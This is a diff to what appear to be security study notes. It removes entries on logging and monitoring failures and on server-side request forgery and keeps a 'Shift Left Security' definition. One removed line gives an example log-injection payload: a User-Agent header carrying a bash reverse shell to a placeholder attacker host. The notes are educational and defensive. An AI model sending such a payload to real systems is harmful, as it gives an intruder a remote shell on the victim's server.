@@ -1,24 +1,4 @@
 
-Security Logging and Monitoring Failures Attack Scenario
-- An attacker inserts malicious code into a log file entry by manipulating user input to a web application
-- Injects the code into the user agent string: `User-Agent: Mozilla/5.0; /bin/bash -i >& /dev/tcp/attacker_ip/443 0>&1`
-
-Security Logging and Monitoring Failures Attack Scenario
-- Ensure all security related events (login success & failures, access control changes) are logged
-- Establish a documented, tested incident response plan/playbook
-
-Server-Side Request Forgery
-- An attack vector that exploits an application to interact with the internal/external network or the machine itself
-
-Server-Side Request Forgery Typical Vuln
-- Failed web server request validation
-- Poor internal network segmentation to restrict lateral movement
-
-Server-Side Request Forgery Prevention
-- Enable authentication to all internal systems
-- Deploy whitelists of DNS/IP addresses that an application is allowed to access
-
-
 Shift Left Security
 - Incorporating security requirements, security design and security testing earlier in the Software Development Lifecycle (SDLC).
 
